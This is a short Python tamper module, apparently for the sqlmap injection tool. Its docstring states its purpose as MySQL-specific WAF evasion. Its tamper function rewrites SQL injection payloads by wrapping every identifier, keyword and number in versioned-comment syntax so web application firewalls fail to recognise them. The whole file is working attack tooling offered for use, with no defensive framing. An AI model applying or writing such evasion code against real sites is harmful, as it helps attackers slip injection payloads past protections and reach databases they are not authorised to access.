import re

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Wraps all words (identifiers, keywords, function names) and numbers
    in the payload with '/**_**//*!50000... */' for MySQL-specific WAF evasion.
    """
    if payload:
        # This regex captures words (alphanumeric, starting with a letter or underscore)
        # and numbers (integers or floats).
        # \b ensures full word/number matching, preventing partial replacements.
        pattern = r"\b([a-zA-Z_][a-zA-Z0-9_]*|\d+(?:\.\d*)?)\b"

        # The replacement string uses \1 to insert the matched word/number
        # directly into the desired comment structure: /**_**//*!50000<matched_text>*/
        replacement = r"/**_**//*!50000\1*/"
        
        # re.sub performs the replacement across the entire payload.
        # This will wrap every identified word and number.
        ret = re.sub(pattern, replacement, payload)
        
        return ret
    return payload
